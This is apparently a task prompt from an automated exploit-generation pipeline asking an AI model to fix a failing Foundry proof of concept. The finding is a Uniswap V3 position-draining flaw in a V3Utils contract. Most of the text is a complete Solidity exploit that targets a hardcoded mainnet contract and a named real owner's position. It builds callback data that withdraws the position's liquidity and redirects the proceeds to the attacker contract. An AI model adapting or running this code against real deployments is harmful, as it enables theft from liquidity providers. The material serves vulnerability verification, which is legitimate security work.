You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Any approved NFT operator can force callback execution and drain a position's withdrawable value
- claim: `onERC721Received` only checks that the NFT came from the Uniswap position manager, then blindly decodes and executes arbitrary `Instructions` against the transferred position before returning the NFT to `from`. It never verifies that the owner initiated the transfer or that the flow came through `execute()`. Because any address approved for the position NFT can call `nonfungiblePositionManager.safeTransferFrom(owner, address(this), tokenId, abi.encode(instructions))`, an approved operator can force `WITHDRAW_AND_COLLECT_AND_SWAP`, `COMPOUND_FEES`, or `CHANGE_RANGE` with attacker-chosen parameters and attacker-controlled `instructions.recipient`.
- impact: Any marketplace, delegated manager, or other approved operator can steal all currently withdrawable liquidity and fees from a victim Uniswap V3 position without retaining custody of the NFT: the victim receives the NFT back after execution, but the tokens have already been redirected.
- exploit_paths: ["Victim grants `approve(tokenId)` or `setApprovalForAll` on their Uniswap V3 position NFT to an external operator.", "The operator calls `nonfungiblePositionManager.safeTransferFrom(owner, address(V3Utils), tokenId, abi.encode(instructions))` directly, setting `instructions.recipient` to an attacker-controlled address and choosing a draining action.", "`V3Utils` decreases liquidity, collects fees, optionally swaps, and pays the resulting tokens to the attacker before returning the now-depleted NFT to `from`."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
}

interface INonfungiblePositionManagerMinimal {
    function positions(uint256 tokenId)
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        );

    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;
}

contract FlawVerifier {
    uint8 internal constant ACTION_WITHDRAW_AND_COLLECT_AND_SWAP = 1;

    address internal constant TARGET = 0x531110418d8591C92e9cBBFC722Db8FFb604FAFD;
    address internal constant POSITION_MANAGER = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // Real pre-fork position inferred from the only public V3Utils interaction before block 16653389:
    // tx 0x691b4bc3f5bcb7f57f19fe2cc7d66268cba84c5c66ebc145756b258b7b80013a at block 16623773
    // increased liquidity on tokenId 422882 from owner kengkeng.eth.
    //
    // Exploit-path mapping:
    // 1. Victim position exists on-chain and has withdrawable value.
    // 2. The approved operator must call safeTransferFrom(owner, V3Utils, tokenId, abi.encode(instructions)).
    // 3. V3Utils callback decreases liquidity / collects fees and redirects proceeds to instructions.recipient.
    // 4. V3Utils returns the NFT back to `from`, leaving the position drained.
    //
    // This verifier uses itself as the operator in step 2. If the low-level transfer call fails on the fork,
    // the concrete missing precondition is that this verifier was not an approved operator for the real victim
    // position at block 16653389. Under the task constraints, that makes the path mechanically infeasible here.
    address internal constant CANDIDATE_OWNER = 0xb88d3ADE7E4231c97038F6D82475A233772fFC25;
    uint256 internal constant CANDIDATE_TOKEN_ID = 422882;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool public attempted;
    bool public exploitSucceeded;
    bytes public lastError;

    constructor() {
        _profitToken = WETH;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (attempted) {
            _syncProfit();
            return;
        }
        attempted = true;

        _attemptDirectApprovedOperatorPath(CANDIDATE_OWNER, CANDIDATE_TOKEN_ID);
        _syncProfit();
    }

    function _attemptDirectApprovedOperatorPath(address owner, uint256 tokenId) internal {
        (address targetToken, uint128 liquidity, bool hasWithdrawableValue) = _readExploitState(tokenId);
        if (!hasWithdrawableValue) {
            lastError = abi.encodePacked("candidate position has no withdrawable value");
            return;
        }

        bytes memory callbackData = _buildCallbackData(targetToken, liquidity);

        (bool ok, bytes memory err) = POSITION_MANAGER.call(
            abi.encodeWithSelector(
                INonfungiblePositionManagerMinimal.safeTransferFrom.selector,
                owner,
                TARGET,
                tokenId,
                callbackData
            )
        );

        exploitSucceeded = ok;
        if (!ok) {
            lastError = err;
        }
    }

    function _readExploitState(uint256 tokenId) internal view returns (address targetToken, uint128 liquidity, bool hasWithdrawableValue) {
        (bool ok, bytes memory data) = POSITION_MANAGER.staticcall(
            abi.encodeWithSelector(INonfungiblePositionManagerMinimal.positions.selector, tokenId)
        );
        if (!ok || data.length < 32 * 12) {
            return (address(0), 0, false);
        }

        address token0;
        address token1;
        uint128 tokensOwed0;
        uint128 tokensOwed1;
        uint128 positionLiquidity;

        assembly {
            token0 := shr(96, mload(add(data, 0x60)))
            token1 := shr(96, mload(add(data, 0x80)))
            positionLiquidity := mload(add(data, 0x100))
            tokensOwed0 := mload(add(data, 0x160))
            tokensOwed1 := mload(add(data, 0x180))
        }

        targetToken = token0 == WETH ? token0 : token1 == WETH ? token1 : token0;
        liquidity = positionLiquidity;
        hasWithdrawableValue = positionLiquidity != 0 || tokensOwed0 != 0 || tokensOwed1 != 0;
    }

    function _buildCallbackData(address targetToken, uint128 liquidity) internal view returns (bytes memory) {
        bytes memory out = new bytes(800);
        assembly {
            let ptr := add(out, 0x20)
            mstore(add(ptr, 0x00), ACTION_WITHDRAW_AND_COLLECT_AND_SWAP)
            mstore(add(ptr, 0x20), targetToken)
            mstore(add(ptr, 0x80), 0x2a0)
            mstore(add(ptr, 0xe0), 0x2c0)
            mstore(add(ptr, 0x100), 0xffffffffffffffffffffffffffffffff)
            mstore(add(ptr, 0x120), 0xffffffffffffffffffffffffffffffff)
            mstore(add(ptr, 0x1a0), liquidity)
            mstore(add(ptr, 0x200), not(0))
            mstore(add(ptr, 0x220), address())
            mstore(add(ptr, 0x260), 0x2e0)
            mstore(add(ptr, 0x280), 0x300)
        }
        return out;
    }

    function _syncProfit() internal {
        _profitAmount = IERC20Minimal(_profitToken).balanceOf(address(this));
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not cover paths indexes: 0
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
